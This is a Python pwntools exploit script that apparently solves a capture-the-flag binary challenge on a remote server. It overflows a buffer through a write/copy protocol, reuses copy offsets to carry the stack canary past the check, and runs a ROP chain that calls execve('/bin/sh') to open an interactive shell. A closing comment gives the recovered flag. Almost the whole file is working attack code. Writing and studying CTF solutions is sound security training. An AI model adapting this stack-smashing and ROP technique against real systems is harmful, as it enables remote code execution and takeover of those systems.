#!/usr/bin/python3

from pwn import *

address = 'mim2022.tailcall.net'
port = 30004

# 0x0000000000449467 : pop rax ; ret
pop_rax = 0x0000000000449467
# 0x00000000004018c2 : pop rdi ; ret
pop_rdi = 0x00000000004018c2
# 0x000000000040f38e : pop rsi ; ret
pop_rsi = 0x000000000040f38e
# 0x00000000004017cf : pop rdx ; ret
pop_rdx = 0x00000000004017cf
# 0x00000000004012d3 # syscall
syscall = 0x00000000004012d3

def write(msg):
    return p16(len(msg)) + p16(0) + msg

def copy(length, dist):
    return p16(length) + p16(dist)

def stop():
    return p32(0)

buf_size = 0x400
pad_size = 0x8
canary_offset = 0x510
prevframe_offset = 0x450
execve_code = 0x3b
binsh = b"/bin/sh\0"

ropchain  = write(p64(pop_rdi)) + copy(0x8, prevframe_offset) # pop rdi <- prevframe_offset
ropchain += write(p64(pop_rax)  + p64(execve_code))           # pop rax <- execve_code
ropchain += write(p64(pop_rsi)  + p64(0))                     # pop rsi <- 0
ropchain += write(p64(pop_rdx)  + p64(0))                     # pop rdx <- 0
ropchain += write(p64(syscall))

payload  = write(cyclic(buf_size + pad_size))
payload += copy(0x8, canary_offset)
payload += write(binsh)
payload += ropchain
payload += stop()

p = remote(address, port)
p.recvline() # receive greeting
p.send(payload)
p.recv()
p.interactive()

# After execution:
# ls
# cat flag.txt
# BSK{N0w_7ry_tH3_H4rd3R_V3R810n}
